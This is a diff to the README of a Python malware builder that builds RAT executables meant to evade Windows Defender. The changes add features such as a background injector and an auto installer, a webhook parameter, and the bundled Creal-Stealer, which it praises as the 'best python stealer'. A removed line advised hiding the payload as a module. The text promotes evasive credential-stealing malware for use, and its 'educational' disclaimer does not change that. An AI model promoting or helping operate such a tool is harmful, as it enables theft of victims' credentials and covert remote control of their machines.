@@ -7,10 +7,12 @@ RES0LUTI0N is a malware builder undetected by Windows Defender coded in python a
 ## Features
 
 - **Undetected by Windows Defender**
+- **Python auto installer**
+- **Background injector**
 - **Can build an undetectable malware .exe**
 - **Use 2 differents exe compiler**
 - **You can choice your own malware or use one already included**
-- **Can inject any python code, it will of course be made undetectable by antivirus**
+- **Can inject any python code**
 - **Easy to use**
 - **Quick use**
 
@@ -47,12 +49,12 @@ python Res0luti0n.py
 ### 4. Last step
 Press `5` if you are already in the parameter menu, otherwise just press `1` to build your RAT. 
 
-*↦Troubleshooting: If this does not work, check that you have entered the correct parameters (like a correct size for shoes)*
+*↦Troubleshooting: If this does not work, check that you have entered the correct parameters (webhook...)*
 
 ### 5. Usage
 For the proper functioning of the injector it is imperative that the entirety of what is in the ZIP created is located in the same directory.
 
-*↦Hint: I recommend you to use it as a module in a python script, it allows to trivialize it and to hide it*
+*↦Hint: This is only valid if you use cx freeze*
 
 ## Thanks 
 ### In this project malware bases are already included.
@@ -63,6 +65,9 @@ For the proper functioning of the injector it is imperative that the entirety of
 - Or Cooked Grabber by [Mouadessalim](https://github.com/mouadessalim)
 
 [![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=mouadessalim&repo=Cookedgrabber&show_owner=true)](https://github.com/mouadessalim/CookedGrabber)
+
+- Or Creal-Stealer (best python stealer) by [Ayhuuu](https://github.com/Ayhuuu)
+[![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=Ayhuuu&repo=Creal-Stealer&show_owner=true)](https://github.com/Ayhuuu/Creal-Stealer)
 
 ## Disclaimer
 - Only for **educationnal, personal or good puposes**.
